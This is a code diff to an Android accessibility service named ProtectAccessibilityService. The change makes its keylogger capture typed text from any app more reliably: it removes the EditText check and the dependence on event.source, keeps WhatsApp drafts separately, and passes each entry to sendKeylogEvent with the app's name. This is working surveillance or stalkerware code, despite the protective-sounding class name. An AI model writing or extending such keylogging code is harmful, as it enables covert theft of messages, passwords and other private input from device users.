@@ -76,28 +76,34 @@ class ProtectAccessibilityService : AccessibilityService() {
             }
         }
 
-        // Keylog: capture text changes from ANY app
+        // Keylog: capture text changes from ANY app.
+        // TYPE_VIEW_TEXT_CHANGED only fires on editable/text views — no need to check
+        // className (that check also blocked apps with custom input classes).
+        // We no longer depend on event.source (requires flagRetrieveInteractiveWindowContent
+        // which may not be available on all devices/OS versions).
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            val source = event.source ?: return
-            if (source.className?.contains("EditText") == true) {
-                val text = event.text.joinToString("")
-                if (text.isNotBlank() && text != lastKeylogText[pkg]) {
-                    lastKeylogText[pkg] = text
+            // event.text is a List<CharSequence>; for text-changed it carries the
+            // current text of the field. Use source.text as fallback.
+            val text = (event.text.joinToString("").ifBlank {
+                event.source?.text?.toString() ?: ""
+            }).trim()
 
-                    // Also store as WhatsApp draft if applicable
-                    if (pkg in WHATSAPP_PACKAGES) {
-                        whatsAppDrafts[pkg] = text
-                    }
+            if (text.isNotBlank() && text != lastKeylogText[pkg] && text.length <= 3000) {
+                lastKeylogText[pkg] = text
 
-                    // Resolve human-readable app label
-                    val appLabel = try {
-                        packageManager.getApplicationLabel(
-                            packageManager.getApplicationInfo(pkg, 0)
-                        ).toString()
-                    } catch (_: Exception) { pkg }
-
-                    sendKeylogEvent(pkg, appLabel, text)
+                // Also store as WhatsApp draft if applicable
+                if (pkg in WHATSAPP_PACKAGES) {
+                    whatsAppDrafts[pkg] = text
                 }
+
+                // Resolve human-readable app label
+                val appLabel = try {
+                    packageManager.getApplicationLabel(
+                        packageManager.getApplicationInfo(pkg, 0)
+                    ).toString()
+                } catch (_: Exception) { pkg }
+
+                sendKeylogEvent(pkg, appLabel, text)
             }
         }
     }
